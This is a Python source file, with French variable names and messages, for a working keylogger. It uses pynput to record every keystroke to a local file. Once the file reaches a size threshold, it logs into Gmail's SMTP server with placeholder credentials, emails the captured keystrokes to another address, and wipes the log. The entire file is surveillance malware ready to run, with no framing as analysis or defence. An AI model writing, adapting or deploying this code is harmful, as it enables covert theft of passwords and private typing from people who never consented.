import smtplib
import os
from pynput import keyboard


LOG_FILE = "keylogger.txt" 
BUFFER_LIMIT = 10  
FILE_LIMIT = 50 

keys_buffer = []  


def on_press(key):
    global keys_buffer

    
    try:
        keys_buffer.append(key.char)  
    except AttributeError:
        keys_buffer.append(f"[{key}]") 
    
    if len(keys_buffer) >= BUFFER_LIMIT:
        save_to_file()


def save_to_file():
    global keys_buffer

   
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write("".join(keys_buffer))
    keys_buffer.clear()  

    
    if os.path.getsize(LOG_FILE) >= FILE_LIMIT:
        send_email()


def send_email():
   
    expediteur = "user1@gmail.com"  
    mot_de_passe = "password_of_user1"  
    destinataire = "user2@gmail.com"  

    
    with open(LOG_FILE, "r", encoding="utf-8") as file:
        contenu = file.read()

    
    sujet = "Frappes capturées"
    message = f"Subject: {sujet}\n\n{contenu}"

    try:
       
        serveur = smtplib.SMTP("smtp.gmail.com", 587)
        serveur.starttls()  
        serveur.login(expediteur, mot_de_passe)  

    
        serveur.sendmail(expediteur, destinataire, message.encode("utf-8"))  
        print("Email envoyé avec succès.")


        open(LOG_FILE, "w", encoding="utf-8").close()
        serveur.quit() 
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'email : {e}")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
